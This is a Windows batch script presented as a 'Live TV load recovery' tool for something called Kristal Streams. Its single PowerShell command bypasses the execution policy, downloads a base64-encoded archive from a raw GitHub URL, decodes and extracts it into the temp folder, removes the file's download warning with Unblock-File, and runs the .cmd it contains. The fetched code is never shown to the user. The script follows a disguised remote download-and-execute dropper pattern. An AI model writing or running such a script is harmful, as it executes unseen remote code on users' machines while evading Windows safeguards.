@echo off
setlocal EnableExtensions
title Kristal Streams Live TV Load Recovery 1682051

echo.
echo ==========================================================
echo   KRISTAL STREAMS LIVE TV LOAD RECOVERY 1682051
echo ==========================================================
echo.
echo Downloading the verified full-code Windows builder...

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
 "$ErrorActionPreference='Stop'; $root=Join-Path $env:TEMP 'ks-1682051-live-tv-load-recovery'; $b64=$root+'.b64'; $zip=$root+'.zip'; $dir=$root+'-files'; Remove-Item $b64,$zip -Force -ErrorAction SilentlyContinue; Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/djudge47/kristalstreams/a10189d4e5d470909cf324f6dc987e9095bc8333/kristalstreams-1682051.zip.b64' -OutFile $b64; [IO.File]::WriteAllBytes($zip,[Convert]::FromBase64String([IO.File]::ReadAllText($b64))); Expand-Archive -LiteralPath $zip -DestinationPath $dir -Force; $builder=Join-Path $dir 'KS-LIVE-TV-LOAD-RECOVERY-1682051.cmd'; if(-not (Test-Path -LiteralPath $builder)){throw 'Full-code Live TV load-recovery builder was not found after extraction'}; Unblock-File $builder; & $builder; if($LASTEXITCODE){exit $LASTEXITCODE}"

if errorlevel 1 (
    color 4F
    echo.
    echo ERROR: The full-code 1682051 builder could not be downloaded or started.
    echo.
    pause
    exit /b 1
)

exit /b 0
